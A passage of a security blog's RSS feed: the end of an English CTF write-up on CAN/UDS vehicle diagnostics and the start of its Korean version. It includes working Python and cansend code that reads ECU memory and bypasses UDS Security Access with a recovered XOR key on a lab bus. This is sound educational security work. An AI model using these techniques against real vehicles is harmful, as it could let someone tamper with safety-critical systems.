class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>First, write the code to perform a read operation on the memory in the <code>0x1A000</code> region.</p><p><img src="image26.png" alt="image26.png"></p><p>Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.</p><p>After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>It can be seen that performing an XOR operation on those values results in a fixed value of <code>0x5539aa17</code>.</p><p>Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is <code>seed ^ 0x5539aa17</code>.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(DLC:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(DLC:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (<code>67</code>).</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>The code to unlock Security Access Level 1 can also be written.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-CVEs-occurring-due-to-UDS-commands"><a href="#4-CVEs-occurring-due-to-UDS-commands" class="headerlink" title="4. CVEs occurring due to UDS commands"></a>4. CVEs occurring due to UDS commands</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>, which occurred in the Nissan Altima.</p><p>CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.</p><p>Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (<code>22</code>) and various Diagnostic Requests (<code>19</code>, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (<code>27</code>) bypass. In particular, if validation for Read Memory By Address Request (<code>23</code>) is inadequate, the firmware can be leaked through internal memory access.</p><p>Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.</p><p>Next time, I will return with a different embedded topic! Thank you! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] BlockHarbor CTF와 CVE로 알아보는 CAN / UDS 취약점 (KR)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>&#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xBD84;&#xC57C;&#xAC00; &#xBC14;&#xB85C; CAN &#xD1B5;&#xC2E0;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB3C4; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;! &#xC774; &#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CTF&#xC640; &#xB300;&#xD68C;&#xB4E4; &#xB610;&#xD55C; &#xB9CE;&#xC774; &#xAC1C;&#xCD5C;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(Defcon&#xC5D0;&#xC11C;&#xB3C4; car hacking village&#xAC00; &#xC788;&#xC8E0;).</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; CTF&#xB85C; &#xAC00;&#xC7A5; &#xC720;&#xBA85;&#xD55C; CTF &#xC911; &#xD558;&#xB098;&#xC778; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xCC28;&#xB7C9; &#xD1B5;&#xC2E0;&#xACFC; &#xC774;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN &#xD1B5;&#xC2E0;&#xC740; &#xCC28;&#xB7C9; &#xB0B4;&#xC758; ECU(&#xC804;&#xC790; &#xC81C;&#xC5B4; &#xC7A5;&#xCE58;) &#xAC19;&#xC740; &#xC7A5;&#xCE58;&#xB4E4; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xD1B5;&#xC2E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. Non-host &#xBC84;&#xC2A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xAE30;&#xBC18;&#xC758; &#xC800;&#xC218;&#xC900; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 1983&#xB144;&#xC5D0; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; HTTP&#xBCF4;&#xB2E4; &#xBA3C;&#xC800; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;! CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; 8 Byte&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xB97C; &#xD655;&#xC7A5;&#xD55C; CAN-FD&#xB294; 64 Byte&#xAE4C;&#xC9C0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISO 15765&#xC5D0; &#xC758;&#xD574; CAN &#xD1B5;&#xC2E0; &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xAD6D;&#xC81C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS&#xB294; &#xD1B5;&#xD569; &#xC9C4;&#xB2E8; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC758;&#xBBF8;&#xD558;&#xBA70;, &#xCC28;&#xB7C9; CTF&#xC640; CAN &#xD1B5;&#xC2E0;&#xC744; &#xC811;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; UDS&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xC790;&#xC8FC; &#xB9C8;&#xC8FC;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; ECU&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC9C4;&#xB2E8; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xC218;&#xC900;&#xC758; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBCF4;&#xB2E4; &#xACE0;&#xC218;&#xC900;&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB370;&#xC774;&#xD130; R/W &#xAC19;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, CAN &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC640; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2 &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xD63C;&#xC7AC; &#xB418;&#xC5B4; &#xC6A9;&#xC5B4; &#xC124;&#xBA85;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. ISO 14229&#xB85C; UDS&#xC5D0; &#xB300;&#xD55C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88;&#xC5D0; &#xD480; BlockHarbor CTF&#xC5D0;&#xC11C;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xB97C; &#xC544;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xAD6C;&#xC131;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC911;&#xC5D0;&#xC11C; &#xAC01; &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CAN ID: &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD560; ECU</li><li>PCI: &#xC8FC;&#xB85C; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xAE38;&#xC774;(DLC), Flow Control &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;</li><li>SID: &#xC11C;&#xBE44;&#xC2A4; &#xC2DD;&#xBCC4;&#xC790;<ul><li>Sub Function Byte: SID&#xC5D0; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC635;&#xC158;</li></ul></li><li>DID: &#xB370;&#xC774;&#xD130; &#xC2DD;&#xBCC4;&#xC790;</li></ul><p>&#xC774;&#xC911; &#xC911;&#xC694;&#xD55C; &#xBA87; &#xAC00;&#xC9C0; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image04.png" alt="image04.png"></p><p>CAN ID&#xB294; ISO 15765-4&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xAC01; ECU&#xC5D0; &#xB300;&#xD55C; CAN ID &#xAC12;&#xC774; 16&#xC9C4;&#xC218;&#xB85C; &#xC815;&#xD574;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>7DF</code>&#xC758; &#xACBD;&#xC6B0; &#xC8FC;&#xB85C; &#xBAA8;&#xB4E0; ECU&#xC5D0; &#xB300;&#xD55C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xB610;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; ECU&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC1A1;&#xC2E0;&#xC758; &#xACBD;&#xC6B0; 1&#xBC88; ECU&#xB294; <code>7E0</code>, 2&#xBC88; ECU&#xB294; <code>7E1</code>&#xC640; &#xAC19;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC218;&#xC2E0;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC1A1;&#xC2E0; &#xAC12;&#xC758; <code>+0x8</code>&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC9C0;&#xC815; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>SID&#xB294; &#xC27D;&#xAC8C; &#xC774;&#xC57C;&#xAE30; &#xD574;&#xC11C; &#xC774;&#xB7F0; &#xD589;&#xC704;(&#xC11C;&#xBE44;&#xC2A4;)&#xB97C; &#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. SID &#xAC12;&#xC740; &#xC5ED;&#xC2DC; &#xD45C;&#xC900;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC9C1;&#xC811; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">&#xBB38;&#xC11C;</a>&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; SID &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xD560; &#xB54C; SID &#xAC12;&#xC5D0; <code>+0x40</code>&#xC758; &#xAC12;&#xC774; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; SID &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD; SID &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; &#xAC12;&#xC778; RSID&#xAC00; &#xC798; &#xC218;&#xC2E0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74;, &#xD1B5;&#xC2E0;&#xC774; &#xC798; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; SID &#xC911;&#xC5D0;&#xC11C; Sub Function Byte&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; SID &#xC694;&#xCCAD; &#xC2DC;, &#xBCF4;&#xB2E4; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC11C;&#xBE44;&#xC2A4; &#xC694;&#xCCAD;&#xC744; &#xC9C0;&#xCE6D;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC5C6;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBB38;&#xC11C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DID&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9C0;&#xCE6D;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. DID &#xAC12;&#xB3C4; ISO-14229 &#xD45C;&#xC900;&#xC5D0; &#xB530;&#xB77C; &#xC608;&#xC57D;&#xB41C; &#xAC12;&#xC774; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">&#xBB38;&#xC11C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xD574;&#xB2F9;&#xD558;&#xB294; DID &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xB300;&#xD45C;&#xC801;&#xC740; DID&#xC758; &#xC608;&#xC2DC;&#xB294; &#xBC14;&#xB85C; &#xCC28;&#xB300; &#xBC88;&#xD638;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; VIN &#xAC12;&#xC778; <code>F190</code>&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; DID &#xAC12;&#xC744; SID&#xC640; &#xD568;&#xAED8; &#xC694;&#xCCAD;&#xD558;&#xBA74;, SID &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; VIN&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBC29;&#xAE08; &#xC124;&#xBA85;&#xD55C; Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; SID&#xC758; &#xACBD;&#xC6B0; DID&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC73C;&#xB85C; &#xD480; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> &#xBB38;&#xC11C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC5F4;&#xC5B4; &#xB193;&#xACE0;, &#xADF8;&#xB54C;&#xB9C8;&#xB2E4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC3E;&#xC544; &#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD558;&#xB294; &#xAC83;&#xC774; &#xB9E4;&#xC6B0; &#xD544;&#xC218;&#xC801;&#xC785;&#xB2C8;&#xB2E4;!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; can-utils &#xB3C4;&#xAD6C;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB3C4;&#xAD6C;&#xB294; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD55C; SocketCAN &#xAE30;&#xBC18;&#xC758; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xC544;&#xB798;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p>candump&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C;&#xB294; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; ASCII &#xACB0;&#xACFC;&#xB97C; &#xAC19;&#xC774; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>-a</code> &#xC635;&#xC158;&#xACFC; ECU1&#xC5D0;&#xC11C;&#xB9CC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB3C4;&#xB85D; <code>7E0</code> &#xBC0F; <code>7FF</code> &#xB9C8;&#xC2A4;&#xD0B9; &#xC778;&#xC790;&#xB97C; 